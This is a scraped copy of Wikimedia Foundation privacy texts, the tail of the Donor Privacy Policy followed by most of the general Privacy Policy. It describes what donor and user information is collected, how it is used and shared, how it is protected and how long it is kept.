WMF is committed to protecting the information we collect from all of our donors. We do not share this information with third parties, except in the specific circumstances described in the "Sharing Donor Information" section of this policy. Because we protect all donors in this manner, we do not change our behavior in response to a web browser's Do Not Track signal. For information about DNT on Wikimedia sites, please visit the main Wikimedia Foundation Privacy Policy FAQ.


HOW WE USE DONOR INFORMATION

We use Donor Information collected from you for general administrative purposes and to operate our fundraising processes. This includes:

 * administering the Wikimedia Fundraising Services;
 * updating you about upcoming fundraising and other WMF activities;
 * thanking you for your donation; and
 * setting language preferences.

We engage in the foregoing activities to manage our contractual relationship with you and for our legitimate interests in managing the Wikimedia Fundraising Services.

We also use Donor Information collected from you to comply with various obligations relating to recordkeeping and reporting. This includes:

 * distributing donation receipts;
 * maintaining our internal records test features;
 * complying with applicable tax requirements;
 * reporting to applicable government agencies as required by applicable law; and
 * communicating substantive changes to this policy and related policies.

We engage in the foregoing activities to comply with our legal obligations and for our legitimate interests in managing our donation processes.

And we use Donor Information collected from you to improve and update the Wikimedia Fundraising Services. This includes:

 * customizing content (for more detail, please see below);
 * understanding donors' interest in WMF;
 * improving our fundraising processes and efforts;
 * conducting internal analyses, such as research and analytics;
 * providing greater security; and
 * conducting survey and metric reports.

We engage in the foregoing activities for our legitimate interests such as improving and protecting our fundraising processes and efforts.

Where processing is based on your consent, you may withdraw your consent at any time consistent with applicable law.


PROVIDING CUSTOMIZED SERVICES

To enhance your experience with Wikimedia Fundraising Services, we use your geographic location to customize the currency, content, and language of our banners. We may also customize what fundraising banners you see or messages you receive, depending on your interactions with past banners or messages.


ACCESSING YOUR DONOR INFORMATION

WMF works hard to accurately process and maintain Donor Information. If you would like to request to access, correct, update, suppress, restrict or delete the Personal Information we have about you, object to our processing of such Personal Information, or if you would like to request to receive an electronic copy of your Personal Information for purposes of transmitting it to another organization (to the extent this right to data portability is provided to you by applicable law), please let us know by contacting us at donatewikimediaorg. While we will make reasonable efforts to comply with your request consistent with applicable law, there are certain situations where we may not grant your request (such as when we cannot adequately verify your identity to give you access to Personal Information, when we are legally required to retain information, or when we are not technologically able to change or delete information at that time).

All emails sent relating to Wikimedia Fundraising Services (with the exception of receipts or administrative notices) include an easy option to unsubscribe. If you would like to change your communication preferences, you (or an authorized representative) can let us know by contacting us at donatewikimediaorg at any time, or clicking the unsubscribe link in an email you receive from us.


SHARING DONOR INFORMATION

We understand that donors may wish to remain anonymous, and we strive to honor such requests and preserve your anonymity. However, in limited circumstances, we use and share Donor Information in the situations and under the conditions described below. We will never sell, trade, or rent your nonpublic Personal Information.

With your permission. With your consent, we may share your information for a particular purpose. For example, we may give donors the option to have their name publicly associated with their donation.

In anonymized form. We may publish or share anonymized Donor Information. For example, we may share anonymized data sets to show donation trends.

Comments and suggestions. We may publish any comments or suggestions that donors provide us, including in promotional materials, in anonymous form. In the rare instance that we do publish such information with donor attribution, we will do so only with your written (which may be electronic) consent.

Online payment processors. In order to facilitate online donations, we have partnered with payment processors. When you make a donation to WMF through the Wikimedia Fundraising Services, whether by credit card, debit card, or other methods of online payment, you transmit your payment data directly to the payment processor. We do our best to use contractual agreements and other mechanisms to help ensure that these processors maintain the confidentiality of your information. However, please be aware that WMF is not responsible for the privacy practices of these processors; please consult the privacy policies of the applicable payment processor for more information about its practices.

Other service providers. We use third-party service providers or contractors who assist with the organization and facilitation of the Wikimedia Fundraising Services, or who help run our fundraising operations or improve your experience with them. Some of our service providers ask us to post links to their privacy policies; a list of these service providers and links to their policies can be found on this page. We may give access to your personal or non-personal information to these providers or contractors as needed to perform their services for us or to use their tools and services. While we cannot ensure the privacy or security of services provided by third-party providers, we do our best to use contractual agreements and other mechanisms to help ensure that these service providers or contractors treat your information consistent with, and in a manner no less protective than, the principles of this policy.

For legal reasons. On certain rare occasions, consistent with our legitimate interest and/or to comply with our legal obligations, we may access, preserve, or disclose to public authorities or other persons your Personal Information if we reasonably believe it is necessary to satisfy a valid and legally enforceable warrant, subpoena, court order, law or regulation, or other judicial or administrative order. If we believe that a particular request for disclosure of a donor's information is legally invalid or an abuse of the legal system, and the affected donor does not intend to oppose the disclosure themselves, we will do our best to fight the request. WMF is committed to notifying you via email at least ten (10) calendar days, when possible, before we disclose your personal information in response to a legal demand. However, we may only be able to provide notice if we are not legally restrained from contacting you, there is no credible threat to bodily harm that is created or increased by notifying you of the request, and you have provided us with an email address or other current contact information.

Nothing in this policy is intended to limit any legal objections or defenses you may have to a third party's request (whether it be civil, criminal, or governmental) to disclose your information. We recommend seeking the advice of legal counsel immediately if such a request is made involving you.

If the organization is transferred. In the extremely unlikely event that ownership of all or substantially all of the WMF changes, or we go through a reorganization (such as a merger, consolidation, or acquisition), further to our legitimate interest, your Personal Information may be transferred. We will provide notice to you via the Wikimedia sites, and a notification on WikimediaAnnounce-L or similar mailing list, at least thirty (30) calendar days before any Personal Information is transferred or becomes subject to a different donor privacy policy.

To protect you, ourselves, or others. If necessary, we may need to use or share your personal information to: enforce or investigate potential violations of our Terms of Use, this Donor Privacy Policy, or any Foundation or user community-based policies; investigate and defend ourselves against legal threats or actions; prevent imminent and serious bodily harm or death to a person; protect our organization, employees, contractors, users, or the public; or detect, prevent, or otherwise assess and address potential spam, malware, fraud, abuse, unlawful activity, and security or technical concerns. We do so to manage our relationship with you, further to our legitimate interest, and/or to comply with our legal obligations.


HOW WE PROTECT YOUR DONOR INFORMATION

To ensure a high level of security and confidentiality, WMF employs a variety of physical, administrative, and technical measures, policies, and procedures to help protect your personal and financial information from unauthorized access, use, alteration, disclosure, or destruction. However, you should be aware that no storage system or data transmission is 100% secure. Therefore, we cannot guarantee that our security protocols will not be compromised.


HOW LONG WE KEEP YOUR DONOR INFORMATION

Once we receive Personal Information from you, we keep it for the shortest possible interval that is consistent with the maintenance, understanding, and improvement of the WMF donation process, and our obligations under applicable law.

For information on Wikimedia's general data retention policies on the Wikimedia projects, please see our Data Retention Guidelines.


WIKIMEDIA AFFILIATES

Wikimedia affiliates (such as chapters) are independent organizations, which sometimes conduct their own fundraising efforts. While some affiliates may give a portion of the funds they raise to WMF, WMF is not involved in processing donations made to these organizations. Wikimedia affiliates have different privacy policies and practices depending on local legal requirements and other considerations. This policy does not explicitly cover donations made to them.


CHANGES TO THIS DONOR PRIVACY POLICY

From time to time, it may be necessary to modify this policy in order to accurately reflect our data collection and disclosure practices. We reserve the right to do so, and we will provide notice of such changes in a reasonable manner and time. We encourage you to review the most up-to-date version of our Donor Privacy Policy periodically.

Your continued use of the Wikimedia Fundraising Services after any effective date of a subsequent version of this Privacy Policy constitutes acceptance of that version of the Donor Privacy Policy on your part.

Wikimedia Foundation Privacy Policy

This is a summary of the Privacy Policy. To read the full terms, scroll down or click here.
Disclaimer: This summary is not a part of the Privacy Policy and is not a legal document. It is simply a handy reference for understanding the full Privacy Policy. Think of it as the user-friendly interface to our Privacy Policy.


Because we believe that you should not have to provide personal information to participate in the free knowledge movement, you may:

 * Read, edit, or use any Wikimedia Site without registering an account.
 * Register for an account without providing an email address or real name.

Because we want to understand how Wikimedia Sites are used so we can make them better for you, we collect some information when you:

 * Make public contributions.
 * Register an account or update your user page.
 * Use the Wikimedia Sites.
 * Send us emails or participate in a survey or give feedback.

We are committed to:

 * Describing how your information may be used or shared in this Privacy Policy.
 * Using reasonable measures to keep your information secure.
 * Never selling your information or sharing it with third parties for marketing purposes.
 * Only sharing your information in limited circumstances, such as to improve the Wikimedia Sites, to comply with the law, or to protect you and others.
 * Retaining your data for the shortest possible time that is consistent with maintaining, understanding, and improving the Wikimedia Sites, and our obligations under applicable law.

Be aware:

 * Any content you add or any change that you make to a Wikimedia Site will be publicly and permanently available.
 * If you add content or make a change to a Wikimedia Site without logging in, that content or change will be publicly and permanently attributed to the IP address used at the time rather than a username.
 * Our community of volunteer editors and contributors is a self-policing body. Certain administrators of the Wikimedia Sites, who are chosen by the community, use tools that grant them limited access to nonpublic information about recent contributions so they may protect the Wikimedia Sites and enforce policies.
 * This Privacy Policy does not apply to all sites and services run by the Wikimedia Foundation, such as sites or services that have their own privacy policy (like the Wikimedia Shop) or sites or services run by third parties (like third-party developer projects on Wikimedia Cloud Services).
 * As part of our commitment to education and research around the world, we occasionally release public information and aggregated or non-personal information to the general public through data dumps and data sets.
 * For the protection of the Wikimedia Foundation and other users, if you do not agree with this Privacy Policy, you may not use the Wikimedia Sites.

INTRODUCTION


WELCOME!



The Wikimedia Foundation is the nonprofit organization that operates collaborative, free knowledge websites, like Wikipedia, Wikimedia Commons, and Wiktionary.

This Policy explains how we collect, use, and share your Personal Information.

 * We collect very little Personal Information about you.
 * We do not rent or sell your Personal Information to third parties.

By using Wikimedia Sites, you consent to this Policy.

The Wikimedia movement is founded on a simple, but powerful principle: we can do more together than any of us can do alone. We cannot work collectively without gathering, sharing, and analyzing information about our users as we seek new ways to make the Wikimedia Sites more usable, safer, and more beneficial.

We believe that information-gathering and use should go hand-in-hand with transparency. This Privacy Policy explains how the Wikimedia Foundation, the non-profit organization that hosts the Wikimedia Sites, like Wikipedia, collects, uses, and shares information we receive from you through your use of the Wikimedia Sites. It is essential to understand that, by using any of the Wikimedia Sites, you consent to the collection, transfer, processing, storage, disclosure, and use of your information as described in this Privacy Policy. That means that reading this Policy carefully is important.

We believe that you should not have to provide nonpublic Personal Information to participate in the free knowledge movement. You do not have to provide things like your real name, address, or date of birth to sign up for a standard account or contribute content to the Wikimedia Sites.

We do not sell or rent your Personal Information, nor do we give it to others to sell you anything. We use it to figure out how to make the Wikimedia Sites more engaging and accessible, to see which ideas work, and to make learning and contributing more fun. Put simply: we use this information to make the Wikimedia Sites better for you.

After all, it is people like you, the champions of free knowledge, who make it possible for the Wikimedia Sites to not only exist, but also grow and thrive.



DEFINITIONS

Back to top


We recognize that only a minority of you are familiar with technical terms like "tracking pixels" and "cookies" used in the Privacy Policy.

Whether you are brand new to privacy terminology or you are an expert who just wants a refresher, you might find our Glossary of Key Terms helpful.

Because everyone (not just lawyers) should be able to easily understand how and why their information is collected and used, we use common language instead of more formal terms throughout this Policy. To help ensure your understanding of some particular key terms, here is a table of translations:




When we say... ...we mean: "the Wikimedia Foundation" / "the Foundation" / "we" / "us" / "our" The Wikimedia Foundation, Inc., the non-profit organization that operates the Wikimedia Sites. "Wikimedia Sites" / "our services" Wikimedia websites and services (regardless of language), including our main projects, such as Wikipedia and Wikimedia Commons, as well as mobile applications, Application Programming Interfaces (APIs), emails, and notifications; excluding, however, sites and services listed in the "What This Privacy Policy Does Not Cover" section below. "you" / "your" / "me" You, regardless of whether you are an individual, group, or organization, and regardless of whether you are using the Wikimedia Sites or our services on behalf of yourself or someone else. "this Policy" / "this Privacy Policy" This document, entitled the "Wikimedia Foundation Privacy Policy". "contributions" Content you add or changes you make to any Wikimedia Sites. "Personal information" Information you provide us or information we collect that could be used to personally identify you. To be clear, while we do not necessarily collect all of the following types of information, we consider at least the following to be "personal information" if it is otherwise nonpublic and can be used to identify you: (a) your real name, address, phone number, email address, password, identification number on government-issued ID, IP address, user-agent information, payment account number; (b) when associated with one of the items in subsection (a), any sensitive data such as date of birth, gender, sexual orientation, racial or ethnic origins, marital or familial status, medical conditions or disabilities, political affiliation, and religion. "third party" / "third parties" Individuals, entities, websites, services, products, and applications that are not controlled, managed, or operated by the Wikimedia Foundation. This includes other Wikimedia users and independent organizations or groups who help promote the Wikimedia movement such as Wikimedia chapters, thematic organizations, and user groups as well as volunteers, employees, directors, officers, grant recipients, and contractors of those organizations or groups.




WHAT THIS PRIVACY POLICY DOES AND DOES NOT COVER

Except as explained below, this Privacy Policy applies to our collection and handling of information about you that we receive as a result of your use of any of the Wikimedia Sites. This Policy also applies to information that we receive from our partners or other third parties. To understand more about what this Privacy Policy covers, please see below.

Examples of What This Privacy Policy Covers

For the sake of clarity, this Privacy Policy covers, regardless of language:

 * All of our major sites (found at list of major projects), such as Wikipedia, including user pages, discussion pages, and noticeboards.
 * Our blogs and APIs (unless we have provided a separate policy for those services).
 * Official Wikimedia Foundation mobile applications.
 * Emails, SMS, and notifications from us or sent to us from you.

This Privacy Policy, however, does not cover some situations where we may gather or process information. For example, some uses may be covered by separate privacy policies (like those of the Wikimedia Shop) or sites or services run by third parties (such as third-party developer projects on Wikimedia Cloud Services). To understand more about what this Privacy Policy does not cover, please see below.



More on what the Wikimedia Foundation Privacy Policy does not cover

This section is part of the Privacy Policy and is meant to explain in detail which situations are not covered by our Privacy Policy.

Wikimedia Sites and Tools with alternative policies Some Wikimedia Foundation websites or tools have alternative privacy policies or provisions that differ from this Privacy Policy. These websites include:
 * Wikipedia Store (covered by the shop's policy);
 * donate.wikimedia.org, including the donation process, such as clicking on a donation banner (covered by the Donor Privacy Policy); and
 * The Wikipedia Reading Lists Browser Extension, which is governed by a separate Privacy Policy. This separate policy will also be made available where the Extension can be downloaded.

If a Wikimedia Foundation website is governed by an alternative privacy policy, it will link to such policy. When a Wikimedia Foundation tool is governed by an alternative privacy policy, the page where the tool may be downloaded or enabled will include a link to that policy. Community members The Wikimedia Sites are collaborative labors of love that are constantly maintained and updated by a global community of volunteers. This global community of volunteers may sometimes have access to personal Information in order to ensure the functioning of the Wikimedia Sites.
 * Administrative volunteers, such as CheckUsers or Stewards. These are volunteers who enforce Wikimedia Site policies and ensure the safety of the Wikimedia Sites. When these administrators access Personal Information that is nonpublic, they are required to comply with our Access to nonpublic personal data policy, as well as other, tool-specific policies.
 * Tool providers. We support platforms for third-party developers to experiment and develop new tools and sites, such as wmflabs.org. When you use one of the tools developed by these volunteers, you may transfer information to them. When these volunteers access nonpublic information or Personal Information, they are required to comply with the terms governing the particular platform the tool is available on.
 * Other users. We provide several tools that allow users to communicate with each other. The communications may be covered by this Policy while they pass through our systems, but the users who receive these communications, and what they do with the communications once they receive them, are not covered by this Policy. Examples include:
   * posting to Foundation-hosted email lists;
   * requesting support from volunteers through our online ticketing system (email sent to infowikimedia.org goes to this system);
   * emailing other users through the Wikimedia Sites (for example, by using the "Email this user" feature); and
   * chatting on IRC (such as on the #wikipedia channel).

Third parties This Privacy Policy only covers the way the Wikimedia Foundation collects, uses and discloses Personal Information and does not address the practices of third parties. For example, this Privacy Policy does not address the practices of:
 * Websites run by other organizations, like websites linked to from the "References" sections of Wikipedia, or run by Wikimedia chapters or other movement organizations. These organizations may receive information from you if you visit their websites after using one of the Wikimedia Sites. They are governed by their own privacy policies.
 * Mobile applications provided by other organizations or individuals. These organizations or individuals may receive information from you if you use those applications to access the Wikimedia Sites or Wikimedia Site content. They are governed by their own privacy policies.

Sometimes, volunteers may place a data-collecting tool, such as a script, gadget, tracking pixel, or share button, on a Wikimedia Site without our knowledge. This Policy does not cover how third parties handle the information they receive as a result of such a tool. If you come across such a third-party tool, and you believe it violates this Policy, you can remove the tool yourself, or report it to privacywikimedia.org so we can investigate.

Where community policies govern information, such as the CheckUser policy, the relevant community may add to the rules and obligations set out in this Policy. However, they are not permitted to create new exceptions or otherwise reduce the protections offered by this Policy.

COLLECTION & USE OF INFO


TYPES OF INFORMATION WE RECEIVE FROM YOU & HOW WE GET IT



YOUR PUBLIC CONTRIBUTIONS



Whatever you post on Wikimedia Sites can be seen and used by everyone.

When you make a contribution to any Wikimedia Site, including on user or discussion pages, you are creating a permanent, public record of every piece of content added, removed, or altered by you. The page history will show when your contribution or deletion was made, as well as your username (if you are signed in) or your IP address (if you are not signed in). We may use your public contributions, either aggregated with the public contributions of others or individually, to create new features or data-related products for you or to learn more about how the Wikimedia Sites are used, as further explained below in the "How We Use Information We Receive From You" section of this Privacy Policy.

Publicly Visible Information

Unless this Policy says otherwise, you should assume that information that you actively contribute to the Wikimedia Sites, including Personal Information, is publicly visible and can be found by search engines. Like most things on the Internet, anything you share may be copied and redistributed throughout the Internet by other people. Please do not contribute any information that you are uncomfortable making permanently public, like revealing your real name or location in your contributions.

You should be aware that specific data made public by you or aggregated data that is made public by us can be used by anyone for analysis and to infer further information, such as which country a user is from, political affiliation and gender.

Back to top


ACCOUNT INFORMATION & REGISTRATION



You do not need to create an account to use any Wikimedia Site.

If you do create an account, you do not need to give us your name or email address (although you can if you choose to, such as for the "Email this user" feature for example).

If you do not create an account, your contributions will be publicly attributed to your IP address.

Want to create an account? Great! Do not want to create an account? No problem!

You are not required to create an account to read or contribute to a Wikimedia Site, except under rare circumstances. However, if you contribute without signing in, your contribution will be publicly attributed to the IP address associated with your device.

If you want to create a standard account, in most cases we require only a username and a password. However, if you choose not to provide an email address, we cannot help you recover your password.

More on Usernames

Your username will be publicly visible, so please be careful about revealing your real name or other Personal Information in your username. Your password is only used to verify that the account is yours. Your IP address is also automatically submitted to us, and we record it temporarily. This is to protect Wikimedia users and project content; in the event of abuse, IP addresses may be associated with usernames as part of an investigation. No other Personal Information is required: no name, no email address, no date of birth, and no credit card information.

Once created, user accounts cannot be removed entirely (although you can usually hide the information on your user page if you choose to). This is because your public contributions must be associated with their author (you!). In some circumstances, the Wikimedia communities can assist users with removing additional information related to their account from the projects.

To gain a better understanding of the demographics of our users, to localize our services and to learn how we can improve our services, we may ask you for more demographic information, such as gender or age, about yourself. We will tell you if such information is intended to be public or private, so that you can make an informed decision about whether you want to provide us with that information. Providing such information is always completely optional. If you do not want to, you do not have to—it is as simple as that.

LOCATION INFORMATION



GPS & OTHER LOCATION TECHNOLOGIES



Some features we offer work better if we know what area you are in.

If you consent, we can use GPS (and other technologies commonly used to determine location) to show you more relevant content. We keep information obtained by these technologies confidential, except as provided in this Policy. You can learn more by checking out the list of examples of how we use these technologies in our FAQ.

Back to top


METADATA



Sometimes, we automatically receive location data from your device. For example, if you want to upload a photo on the Wikimedia Commons mobile app, we may receive metadata, such as the place and time you took the photo, automatically from your device. Please be aware that, unlike location information collected using GPS signals described above, the default setting on your mobile device typically includes the metadata in your photo or video upload to the Wikimedia Sites. If you do not want metadata sent to us and made public at the time of your upload, please change your settings on your device.

Back to top


IP ADDRESSES



Finally, when you visit any Wikimedia Site, we automatically receive the IP address of the device (or your proxy server) you are using to access the Internet, which could be used to infer your geographical location.

Back to top



INFORMATION RELATED TO YOUR USE OF THE WIKIMEDIA SITES



We use certain technologies to collect information about how you use Wikimedia Sites.

Like other websites, we receive some information about you automatically when you visit the Wikimedia Sites.

We also use a variety of commonly-used technologies, like cookies, to collect information regarding how you use the Wikimedia Sites, make our services safer and easier to use, and to help create a better and more customizable experience for you.

We want to make the Wikimedia Sites better for you by learning more about how you use them. Examples of this might include how often you visit the Wikimedia Sites, what you like, what you find helpful, how you get to the Wikimedia Sites, and whether you would use a helpful feature more if we explained it differently. We also want this Policy and our practices to reflect our community's values. For this reason, we keep information related to your use of the Wikimedia Sites confidential, except as provided in this Policy.

Back to top


INFORMATION WE RECEIVE AUTOMATICALLY



Because of how browsers work, we receive some information automatically when you visit the Wikimedia Sites. This includes when you use an online tool on a third-party site that loads information coming from the Wikimedia Sites. This information includes the type of device you are using (possibly including unique device identification numbers, for some beta versions of our mobile applications), the type and version of your browser, your browser's language preference, the type and version of your device's operating system, in some cases the name of your internet service provider or mobile carrier, the website that referred you to the Wikimedia Sites, which pages you request and visit, and the date and time of each request you make to the Wikimedia Sites.

Put simply, we use this information to enhance your experience with Wikimedia Sites. For example, we use this information to administer the sites, provide greater security, and fight vandalism; optimize mobile applications, customize content and set language preferences, test features to see what works, and improve performance; understand how users interact with the Wikimedia Sites, track and study use of various features, gain understanding about the demographics of the different Wikimedia Sites, and analyze trends.

Back to top


INFORMATION WE COLLECT



We use a variety of commonly-used technologies, like cookies, to understand how you use the Wikimedia Sites, make our services safer and easier to use, and to help create a better and more customizable experience for you.

We actively collect some types of information with a variety of commonly-used technologies. These generally include tracking pixels, JavaScript, and a variety of "locally stored data" technologies, such as cookies and local storage. These types of technologies may also be used in online tools on a third-party site that loads information from the Wikimedia Sites. We realize that some of these technologies do not have the best reputation in town and can be used for less-than-noble purposes. So we want to be as clear as we can about why we use these methods and the type of information we collect with them.

Depending on which technology we use, locally stored data may include text, Personal Information (like your IP address), and information about your use of the Wikimedia Sites (like your username or the time of your visit). See below for more information.

We use this information to make your experience with the Wikimedia Sites safer and better, to gain a greater understanding of user preferences and their interaction with the Wikimedia Sites, and to generally improve our services. We will never use third-party cookies, unless we get your permission to do so. If you ever come across a third-party data collection tool that has not been authorized by you (such as one that may have been mistakenly placed by another user or administrator), please report it to us at privacy@wikimedia.org.

More on Locally Stored Data

Locally stored data, JavaScript, and tracking pixels help us do things like:

 * Provide you with a customizable experience, such as using cookies to know your language preference, to remember the user preferences you set so we can provide you with the customized look and feel that you want, and to tell you about interesting Wikimedia issues and events in your area.
 * Deliver more relevant content to you faster. For example, we use local storage to store your most recently read articles directly on your device, so they can be retrieved quickly. Also, we use cookies to learn about the topics searched so that we can optimize the search results we deliver to you.
 * Understand how you use the Wikimedia Sites, so that we know what works and what is useful. For example, we might use cookies to learn about the list of articles you are following on your watchlist so that we can recommend similar articles that you may be interested in.
 * Understand how you use the Wikimedia Sites across different devices, so that we can make our varied Wikimedia Sites more efficient and effective for you.
 * Make the Wikimedia Sites more convenient to use, such as by using cookies to maintain your session when you log in or to remember your username in the login field.

Want to know even more? You can read more about some of the specific cookies we use, when they expire, and what we use them for in our FAQ.

We believe this data collection helps improve your user experience, but you may remove or disable some or all locally stored data through your browser settings, depending on your browser. You can learn more about some options you have in our FAQ. While locally stored data may not be necessary to use our sites, some features will not function properly if you disable locally stored data.

While the examples above concerning information about you collected through the use of data collection tools are kept confidential in accordance with this Policy, please note that some information about the actions taken by your username is made publicly available through public logs alongside actions taken by other users. For example, a public log may include the date your account was created on a Wikimedia Site along with the dates that other accounts were created on a Wikimedia Site.

OTHER



LOCATION INFORMATION



GPS & OTHER LOCATION TECHNOLOGIES



As stated above, we can use commonly-used location technologies to show you more relevant content. For example, our mobile apps can identify articles from the Wikimedia sites about points of interest near your location. As a reminder, you can consent to and/or deactivate our access to these location technologies at any time for example through the native OS functionalities on your mobile device, and still use the Wikimedia Sites.

Back to top


METADATA



As stated above, we may automatically receive location data from your device. For example, if you upload a photo using the Wikimedia Commons mobile app, please be aware that the default setting on your mobile device typically results in the metadata associated with your photo being included in the upload. As a reminder, if you do not want metadata sent to us and made public at the time of your upload, please change your settings on your device.

Back to top


IP ADDRESSES



When you visit any Wikimedia Site, we automatically receive the IP address of the device (or your proxy server) you are using to access the Internet, which could be used to infer your geographical location. We keep IP addresses confidential, except as provided in this Policy. If you are visiting Wikimedia Sites with your mobile device, we may use your IP address to provide anonymized or aggregated information to service providers regarding the volume of usage in certain areas.

We use this location information to make your experience with the Wikimedia Sites safer and better, to gain a greater understanding of user preferences and their interaction with the Wikimedia Sites, and to generally improve our services. For example, we use this information to provide greater security, optimize mobile applications, and learn how to expand and better support Wikimedia communities. We also use Personal Information in the manner described in the sections of this Policy titled "For Legal Reasons" and "To Protect You, Ourselves & Others."

Back to top





SHARING


WHEN MAY WE SHARE YOUR INFORMATION?



We use and share your Personal Information when you give us specific permission to do so, for legal reasons, and in the other circumstances described below.

WITH YOUR PERMISSION



We share your Personal Information for a particular purpose, if you agree. For example, if you receive a scholarship and we ask permission to share your Personal Information with a local chapter. You can find more information in the list of examples in our FAQ.

Back to top


FOR LEGAL REASONS



We will disclose your Personal Information to public authorities or other persons in response to an official legal process only if we believe it to be legally valid. See also our Requests for user information procedures and guidelines. We will notify you of such requests when possible. We do so to further our legitimate interest and/or to comply with our legal obligations.

We will access, use, preserve, and/or disclose your Personal Information if we reasonably believe it necessary to satisfy a valid and legally enforceable warrant, subpoena, court order, law or regulation, or other judicial or administrative order. However, if we believe that a particular request for disclosure of a user's information is legally invalid or an abuse of the legal system and the affected user does not intend to oppose the disclosure themselves, we will try our best to fight it. We are committed to notifying you via email at least ten (10) calendar days, when possible, before we disclose your Personal Information in response to a legal demand. However, we may only provide notice if we are not legally restrained from contacting you, there is no credible threat to life or limb that is created or increased by disclosing the request, and you have provided us with an email address.

Nothing in this Privacy Policy is intended to limit any legal objections or defenses you may have to a third-party's request (whether it be civil, criminal, or governmental) to disclose your Personal Information. We recommend seeking the advice of legal counsel immediately if such a request is made involving you.

For more information, see our Subpoena FAQ.

Back to top


IF THE ORGANIZATION IS TRANSFERRED (REALLY UNLIKELY!)



In the unlikely event that the ownership of the Foundation changes, we will provide you 30 days' notice before any Personal Information is transferred to the new owners or becomes subject to a different privacy policy.

In the extremely unlikely event that ownership of all or substantially all of the Foundation changes, or we go through a reorganization (such as a merger, consolidation, or acquisition), consistent with our legitimate interest, we will continue to keep your Personal Information confidential, except as provided in this Policy, and provide notice to you via the Wikimedia Sites and a notification on WikimediaAnnounce-L or similar mailing list at least thirty (30) calendar days before any Personal Information is transferred or becomes subject to a different privacy policy.

Back to top


TO PROTECT YOU, OURSELVES & OTHERS



We, or users with certain administrative rights, use and disclose Personal Information that is reasonably necessary to:

 * enforce or investigate potential violations of the Wikimedia Foundation or community-based policies;
 * protect our organization, infrastructure, employees, contractors, or the public; or
 * prevent imminent or serious bodily harm or death to a person.

We do so to manage our relationship with you, to further our legitimate interest, and/or to comply with our legal obligations.

We, or particular users with certain administrative rights as described below, need to use and share your Personal Information if it is reasonably believed to be necessary to enforce or investigate potential violations of our Terms of Use, this Privacy Policy, or any Wikimedia Foundation or user community-based policies. We may also need to access and share Personal Information to investigate and defend ourselves against legal threats or actions.

Wikimedia Sites are collaborative, with users writing most of the policies and selecting from amongst themselves people to hold certain administrative rights. These rights may include access to limited amounts of otherwise nonpublic information about recent contributions and activity by other users. They use this access to help protect against vandalism and abuse, fight harassment of other users, and generally try to minimize disruptive behavior on the Wikimedia Sites. These various user-selected administrative groups have their own privacy and confidentiality guidelines, but all such groups are supposed to agree to follow our Access to nonpublic personal data policy. These user-selected administrative groups are accountable to other users through checks and balances: users are selected through a community-driven process and overseen by their peers through a logged history of their actions. However, the legal names of these users are not known to the Wikimedia Foundation.

We hope that this never comes up, but we may disclose your Personal Information if we believe that it is reasonably necessary to prevent imminent and serious bodily harm or death to a person, or to protect our organization, employees, contractors, users, or the public. We may also disclose your Personal Information if we reasonably believe it necessary to detect, prevent, or otherwise assess and address potential spam, malware, fraud, abuse, unlawful activity, and security or technical concerns. (Check out the list of examples in our FAQ for more information.)

TO OUR SERVICE PROVIDERS



We disclose Personal Information to our third-party service providers or contractors to help run or improve the Wikimedia Sites and provide services in support of our mission.

We use third-party service providers or contractors to help run or improve the Wikimedia Sites for you and other users. We give access to your Personal Information to these providers or contractors as needed to perform their services for us or to use their tools and services. We put requirements, such as confidentiality agreements, in place to help ensure that these service providers treat your Personal Information consistently with, and no less protective of your privacy than, the principles of this Policy. For further information, please see our FAQ.

If you are visiting Wikimedia Sites with your mobile device, we use your IP address to provide anonymized or aggregated information to service providers regarding the volume of usage in certain areas.

Some of our service providers ask us to post links to their privacy policies; a list of these service providers and links to their policies can be found on this page.

Back to top


TO UNDERSTAND & EXPERIMENT


 * We give volunteer developers and researchers access to systems that contain your Personal Information to allow them to protect, develop, and contribute to the Wikimedia Sites.
 * We also share non-Personal Information or aggregated information with third parties interested in studying the Wikimedia Sites.
 * When we share Personal Information with third parties for these purposes, we put reasonable technical and contractual protections in place to protect your Personal Information consistent with this Policy and our legitimate interest.

The open-source software that powers the Wikimedia Sites depends on the contributions of volunteer software developers, who spend time writing and testing code to help it improve and evolve with our users' needs. To facilitate their work, we give some developers limited access to systems that contain your Personal Information, but only as reasonably necessary for them to develop and contribute to the Wikimedia Sites.

Similarly, we share non-Personal Information or aggregated information with researchers, scholars, academics, and other interested third parties who wish to study the Wikimedia Sites. Sharing this Personal Information helps them understand usage, viewing, and demographics statistics and patterns. They then can share their findings with us and our users so that we can all better understand and improve the Wikimedia Sites.

When we give access to Personal Information to third-party developers or researchers, we put requirements, such as reasonable technical and contractual protections, in place to help ensure that these service providers treat your Personal Information consistently with the principles of this Policy and in accordance with our instructions. If these developers or researchers later publish their work or findings, we ask that they not disclose your Personal Information. Please note that, despite the obligations we impose on developers and researchers, we cannot guarantee that they will abide by our agreement, nor do we guarantee that we will regularly screen or audit their projects. (You can learn more about re-identification in our FAQ.)

Back to top


BECAUSE YOU MADE IT PUBLIC



Information that you post is public and can be seen and used by everyone.

Any information you post publicly on the Wikimedia Sites is just that – public. For example, if you put your mailing address on your talk page, that is public, and not specifically protected by this Policy. And if you edit without registering or logging into your account, your IP address will be seen publicly. Please think carefully about your desired level of privacy before you disclose Personal Information on your user page or elsewhere.

PROTECTION


HOW DO WE PROTECT YOUR PERSONAL INFORMATION?



We use a variety of physical and technical measures, policies, and procedures to help protect your Personal Information from unauthorized access, use, or disclosure.

We strive to protect your Personal Information from unauthorized access, use, or disclosure. We use a variety of physical and technical measures, policies, and procedures (such as access control procedures, network firewalls, and physical security) designed to protect our systems and your Personal Information. Unfortunately, there is no such thing as completely secure data transmission or storage, so we cannot guarantee that our security will not be breached (by technical measures or through violation of our policies and procedures).

We will never ask for your password by email (but may send you a temporary password via email if you have requested a password reset). If you ever receive an email that requests your password, please let us know by sending it to privacy@wikimedia.org, so we can investigate the source of the email.

Back to top



HOW LONG DO WE KEEP YOUR DATA?



Except as otherwise stated in this Policy, we only keep your Personal Information as long as necessary to maintain, understand and improve the Wikimedia Sites or to comply with applicable law.

Once we receive Personal Information from you, we keep it for the shortest possible time that is consistent with the maintenance, understanding, and improvement of the Wikimedia Sites, and our obligations under applicable law. In most instances, Personal Information is deleted, aggregated or de-identified after 90 days. Non-Personal Information may be retained indefinitely as appropriate. (Check out the list of examples in our FAQ.)

Please remember that when you make a contribution to any Wikimedia Site, the page history will show when your contribution was made, your username (if you are signed in), or your IP address (if you edit while not logged in). The transparency of the projects' contribution and revision histories is critical to their efficacy and trustworthiness. To learn more about our data retention practices, see our data retention guidelines.

YOUR RIGHTS



If you would like to request access to or removal of your Personal Information, you may contact us.

